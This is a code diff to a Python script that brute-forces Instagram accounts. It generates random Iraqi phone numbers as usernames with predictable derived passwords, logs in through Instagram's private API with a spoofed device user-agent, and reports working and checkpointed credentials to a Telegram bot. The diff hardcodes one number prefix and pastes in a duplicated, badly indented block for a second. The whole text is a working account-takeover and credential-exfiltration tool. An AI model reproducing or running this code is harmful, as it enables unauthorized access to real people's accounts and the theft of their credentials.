@@ -110,8 +110,7 @@ def main():
     while True:
         user = str(''.join((random.choice(new) for i in range(7))))
         q = '+964'
-        print(' 770 - 771 - \n\t 750 - 751 \n\t\t 780 - 781 \n')
-        x = input('Zhmarayak Hllbzhera  : ')
+        x = '770'
         Email = q + x + user
         pas = "0" + x + user
         url = 'https://b.i.instagram.com/api/v1/accounts/login/'
@@ -148,6 +147,46 @@ def main():
         else:
             Sk += 1
             r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas 👩‍💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Ok}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. STERT HACK 🔥: {Sk}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.CH : @SidraTools")
+                    user = str(''.join((random.choice(new) for i in range(7))))
+        q = '+964'
+        x = '771'
+        Email = q + x + user
+        pas = "0" + x + user
+        url = 'https://b.i.instagram.com/api/v1/accounts/login/'
+        headers = {
+            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
+            "Accept": "*/*",
+            "Accept-Encoding": "gzip, deflate",
+            "Accept-Language": "en-US",
+            "X-IG-Capabilities": "3brTvw==",
+            "X-IG-Connection-Type": "WIFI",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            'Host': 'i.instagram.com',
+            'Connection': 'keep-alive'
+        }
+
+        uid = uuid.uuid4()
+        payload = {
+            'uuid': uid,
+            'password': pas,
+            'username': Email,
+            'device_id': uid,
+            'from_reg': 'false',
+            '_csrftoken': 'missing',
+            'login_attempt_countn': '0'}
+        req = r.post(url, headers=headers, data=payload)
+        if 'logged_in_user' in req.json():
+            Ok += 1
+            username = req.json()['logged_in_user']['username']
+            qanasm(username, pas)
+
+        elif '"message":"challenge_required","challenge"' in req.json():
+            Cp += 1
+            r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ⌯  Hi Qanas Coder 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. E𝗆𝖺𝗂𝗅 📧 : {Email}\n\n.✥. PASS 🔐 : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @qan4s .")
+        else:
+            Sk += 1
+            r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas 👩‍💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Ok}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. STERT HACK 🔥: {Sk}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.CH : @SidraTools")
+
 
 
 main()
